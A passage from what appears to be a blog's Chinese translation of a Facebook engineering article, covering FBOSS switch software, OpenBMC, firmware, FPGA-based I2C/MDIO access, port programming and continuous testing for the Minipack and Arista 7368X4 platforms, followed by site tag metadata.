Minipack 和 Arista 7368X4 所有这些都是为了解决我们面临的业务需求，以创纪录的速度（in record time）设计和研发出来的。 在软件方面，FBOSS 需要同时兼容现有生产环境的大量交换机和新的网络。我们的工作 横跨整个 on-switch 软件栈： OpenBMC 对两个新硬件平台的支持 通过我们的可插拔 PIM 设计，在单控制平面内支持模块化 在不同速率下，复杂的端口编程（complex port programming at different speeds） 两个新的 microservers 全新的 I2C（二线制串行总线） MDIO（Management Data Input Output） FPGA 方面的工作 第一代支持外部 PHY 芯片的平台 某些挑战是我们与 Arista 合作开发 7368X4 所特有的。7368X4 除了是一个新平台 ，还是我们第一次在非 Facebook 设计的硬件上运行 FBOSS。这意味着我们要与 Arista 密切合作，设计出满足 FBOSS 要求的硬件，例如给 7368X4 添加 BMC SoC。 我们还重新审视了 FBOSS 一直以来的一些假设前提，例如 UEFI BIOS 支持（Arista 上 不支持），以及交换机如何在 Arista EOS 和 FBOSS 之间切换。 体积越来越大、功能越来越复杂的软件，更新频率通常都会越来越慢，但与此相反，我 们一直坚持着指导我们开发 FBOSS 的原则，该原则在过去五年也指导着我们不断对 FBOSS 进行快速迭代： 专注于对新拓扑和新硬件的精准需求（precise requirements） 极大地扩展仿真、模拟和通用测试的能力（simulation, emulation, and general testing capabilities），以保持我们的单镜像、持续部署哲学（ single-image, continuous-deployment philosophy） 持续参与到数据中心网络的部署和运维工作，包括持续部署新拓扑和硬件、迁 移和排障。 将这些管理单个平台和层次时的原则应用到当前如此庞大的规模并不轻松。这项工作需要在 几方面主动创新： 构建恰当的软件抽象来隐藏各层次的硬件差异。 通过更强大的自动化测试和频繁部署来验证”硬件-软件“层的大量组合。 扩展管理路由的高层控制软件（higher layer control software for routing） ，使之能管理所有数据中心层级（DC tiers）：fabric, spine, and Fabric Aggregator。 接下来将重点介绍以上第 1 和第 2 点。 更多硬件抽象我们的软件栈由几个层次组成： OpenBMC：板卡系统级别（board-system level ）管理软件。 CentOS：底层的 Linux 操作系统；与我们数据中心服务器的内核和操作系统是相同的。 FBOSS：一系列对控制平面和数据平面进行编程的应用（the set of applications）。 图 10. Facebook on-switch 软件栈 我们希望同时在我们的新平台，以及现有的已经大规模部署的 Wedge 40、Wedge 100、 和 Backpack 交换机上运行这三层组件。 FBOSS 中已经有了几个抽象层次，但要运行在新的 Minipack 和 Arista 7368X4 平台上还 需要一些重构或扩展。接下来我们介绍几个这方面的改动例子。 支持新的硬件和 bootloaderFBOSS 通过 BMC SoC 和 OpenBMC 来处理硬件平台之间的差异。 Arista 团队将 BMC SoC 添加到了 7368X4，支持两种操作模式。 Arista EOS 模式：microserver 控制着风扇、电源和其他板上组件（on-board components）。 FBOSS 模式：我们希 BMC 来承担这些环境和板卡管理功能，这样就与我们管理服务器集群的方式是一致的。 设计支持这两种模式之后，就能重用和扩展我们已有的 OpenBMC 技术栈来支持新的硬件平台。 Minipack 的控制模块是 MiniLake， 从软件的角度来看，MiniLake 功能与我们现有的 microserver design 并没有太大差异。 MiniLake 提供带 PXE v6 功能的 UEFI BIOS。有了这个接口，将镜像加载到 Minpack 就是一件非常直接的事情。 MiniLake 的 32G 内存让我们获益良多，让我们使用通用的 Facebook 软件开发基础设施和服务更加方便。 7368X4 的 microserver 是定制的，但更重要的是，Arista 长期以来用的都是一个定制化 coreboot 实现，而不是最常用的 UEFI BIOS，典型的 Facebook 服务器使用的都是后者。 为解决这个问题，我们决定向 OCP Open System Firmware 项目看齐。我们本来就在尝试加 入这个项目，因此通过与 Arista 合作，现在已经有了一个基于 coreboot、u-root 和 LinuxBoot 加载 microserver 镜像的方案。 图 11. OCP open systems firmware (https://systemboot.org/) 有了这种硬件的灵活性之后，我们还需要实现 7368X4 平台上 Arista EOS 和 FBOSS 的自 动化切换。 7368X4 默认装的是 EOS。 如果部署过程中 7368X4 需要运行 FBOSS，会自动地触发一个切换流程。 我们会定期测试 EOS/FBOSS 互切，确保这个流程没有失效。 启用一个端口我们已经习惯于用简单接口（simple interfaces）的方式做端口管理（port management）， 能够轻松地启用或修改平台中任何端口或端口的速度。 Minipack 的模块化设计、独立 PIMs 和外部 PHYs 使得端口管理任务更加频繁。 而启用一个端口这种高层任务最终是需要底层的基础设施来完成的： 图 12. Minipack 硬件组件 与收发器通信。 收发器管理软件（transceiver management software）运行在 microserver 上， 现有的平台上，有一个 I2C 总线将收发器连接到 microserver。 而在 Minipack 的设计中，这将意味着一个 I2C 总线连接到 128 个设备，显而易见 可扩展性不好。 为解决这个问题，我们定做了一个 FPGA 来加速 I2C。这块 FPGA 包含了 一些相对比较标准的 I2C 控制器模块（controller blocks） 一个更加复杂的过程：在收发器上通过后台预取和缓存（background-fetch and cache）数据页，确保跟踪光能级（light levels）、温度和其他感兴趣指标时数据 的最大时效性（maximal freshness）。 由于 Minpack 的空间效率设计非常出色，我们能将 128 个收发器塞进只有 4 RU 大小的空间。 因此我们设计了精密的风扇控制算法来冷却机箱。 尤其是，我们希望将收发器温度考虑进 BMC 上运行的风扇控制算法。 上面提到的缓存设计提供了一种高效地让 BMC 及 microserver 访问收发器 DOM 数 据（例如温度、耗电量）的方式，而无需竞争 I2C 资源。 与外部 PHYs 通信。 这些用的是 MDIO 总线而非 I2C，因此我们在 FPGA 中使用 MDIO 控制器来与这些芯片通信。需要编写一个 MDIO 接口，这个接口既要能对接我们的 C++ 代码库，又要能对 接芯片的 SDK，另外，我们还要利用上 FPGA。 所有这些工作都必须分别为 Minipack 和 Arista 7368X4 实现，因为它们所用的 FPGA 和 gearbox 各不相同。 对外部 PHYs 编程。 能与 PHYs 通信之后，就能对它们进行编程，以获得我们所需的灵活性。 例如，我们首先想支持的配置就是：在变速箱的 ASIC 侧拿出两个 channel，配置 其运行在 50G PAM4，然后将变速箱内的信号转换成 4 个 25G NRZ channels，这样 就在收发器上实现了一个 100G 端口。 此外，我们还必须支持 40G，可选的方式有 2x20G 和 4x10G。展望未来的话，200G 也是能支持的，只要将 ASIC 侧的 4 个 channel 直接映射到 line 侧的 4 个 channel ，但那样我们就无法利用 neighboring port 了。 图 13. Visualizing port programming through an external PHY chip 扩展持续测试（continuous test）的能力我们对原有的测试基础设施进行了扩展，添加了对所有新平台和拓扑部署组合的支持。我们整体的测试策略有三部分： 真实或全生命周期实验室环境（Realistic or full life-cycle lab environments） 测试自动化（test automation） 早期部署（early deployment） F16 fabric 非常占空间，因此我们大大地扩建了实验室环境。虽然无法在实验 室环境搭建一套完整的 F16，但我们力求策略尽量接近，利用并行的链路测试相关特性， 例如流量哈希（traffic hashing，我们在这里吃过亏）。 我们还添加了所有计划部署的“角色-平台-软件”（role-platform-software）组合。用工具 来仿真额外的对端（additional peers），构造很大的规模。 最后，我们确保实验室环境能安全地跑生产管理系统（securely work production management systems），这样就能测试软件的全生命周期。 图 14. SNC 测试拓扑 自动化方面，在开发 F16-Minipack 的过程中，我们向测试基础设施添加了如下两组额外的 测试，这两者都有助于显著加快下次引入新平台的速度： ASIC 级别测试。 这是软件栈的最底层，之前的自动化程度并不高。 在此之前，我们限定新 ASIC 每次只能引入到一个层级（tier），以减少其暴露面（ reduce exposure）和测试负担。 但在 F16 的设计中，新 ASIC 在第一天就会用在三层中的每一层（three different tiers），因此需要我们高优先级自动化 ASIC 级别的测试。 差异测试（On-diff testing）。 Facebook 一直强制对开发者引入的每个软件变更（“diff”）进行持续测试和部署 ，确保运行了完整的测试套件。 我们在 FBOSS 中开始采用这种 on-diff 测试哲学，并利用 Facebook 现有的测试基础 设施，因为对于单个开发者来说，预测他的变更可能产生那些关联影响正变得越来越难 ，因为部署的组合方式太多了。 图 14. 复用 Facebook on-diff 测试工具来测试网络软件 最后，我们持续地拥抱 Facebook 的尽早部署和快速迭代（early deployment and iteration）哲学，这方面的更多内容见 SIGCOMM 2018 paper on FBOSS 。实际上，在我们还没有完全下线 DVT 之前，就已经在用 Minipack 接生产流量了。大部分情况下，我们每周都会在数据中心的某个地方上线一台 Minipack 或 7368X4 设备。 Facebook 所有软件作为一个整体有这样一套哲学： 尽早接入生产环境（getting into production as quickly as possible） 在生产环境站稳（staying in production） 持续迭代（continuously iterating） 对于网络来说，这种哲学有助于我们在两方面发现问题： 交换机软件栈（on-switch software） 大规模部署所需的网络层配套工具和监控（network-level tooling and monitoring） 最后，我们正在开发不仅仅是一个硬件/软件平台，而是一个完备的、可立即部署的交换系统（a complete, ready-to-deploy switching system）。 总结F16 和 HGRID 是网络拓扑，Minipack 和 Arista 7368X4 是硬件平台，也是我们新数据中 心网络的核心。在整体网络设计中，它们在功耗、空间效率和降低复杂度方面都带来了显 著提升，并且构建在易于采购、技术成熟的 100G 光模块基础上。这种新的网络架构 解决了我们不断增长的应用和服务需求。 我们愿意与 OCP 社区和网络生态系统一起合作，因此通过本文分享了我们的网络整体设计 ，并将 Minipack 的完整设计包贡献给了OCP。Arista 也把与我们联合开发过程中形成的技术规范共享给了 OCP 社区。 展望未来，相信在接下来的几年中，一旦速度更快的 ASIC 和光模块成熟，F16 拓扑的 灵活性和模块化交换机设计（modular switch design）将使我们更快地用上它们。在设计 未来的网络平台时，我们将继续沿用这种模块化交换机设计。 最后，感谢使这种新拓扑和新平台成为可能的各团队和行业合作伙伴。","link":"/2020/07/12/重新设计-Facebook-的数据中心网络/"}],"tags":[{"name":"Reproduced","slug":"Reproduced","link":"/tags/Reproduced/"},{"name":"Raspberry-Pi","slug":"Raspberry-Pi","link":"/tags/Raspberry-Pi/"},{"name":"Liunx","slug":"Liunx","link":"/tags/Liunx/"}],"categories":[{"name":"Network","slug":"Network","link":"/categories/Network/"},{"name":"Liunx","slug":"Liunx","link":"/categories/Liunx/"},{"name":"Hardware","slug":"Hardware","link":"/categories/Hardware/"},{"name":"HTTP","slug":"Network/HTTP","link":"/categories/Network/HTTP/"},{"name":"security","slug":"Network/security","link":"/categories/Network/security/"},{"name":"Raspbian","slug":"Liunx/Raspbian","link":"/categories/Liunx/Raspbian/"},{"name":"Raspbian","slug":"Hardware/Raspbian","link":"/categories/Hardware/Raspbian/"},{"name":"Architecture","slug":"Network/Architecture","link":"/categories/Network/Architecture/"}]}